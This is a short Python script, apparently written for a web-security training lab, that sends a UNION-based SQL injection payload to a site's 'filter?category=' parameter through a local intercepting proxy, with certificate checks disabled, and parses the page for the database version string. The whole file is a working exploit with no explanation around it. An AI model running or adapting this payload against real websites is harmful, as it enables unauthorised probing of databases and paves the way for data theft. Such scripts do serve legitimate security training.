import sys
import requests as req
import urllib3
from bs4 import BeautifulSoup as bs
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def getVersion(url):
    p = "' union select null,@@version--+-"
    r = req.get(url + p, verify=False, proxies=proxies)
    res = r.text
    soup = bs(res, 'html.parser')
    ver = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
    if ver is None:
        return False
    else:
        print(f"MySQL/Microsoft Version: {ver}")
        return True


if __name__ == '__main__':
    try:
        url = sys.argv[1] + "filter?category="
        getVersion(url)
    except IndexError:
        print(f"Usage: {sys.argv[0]} <baseUrl>")
        sys.exit(-1)
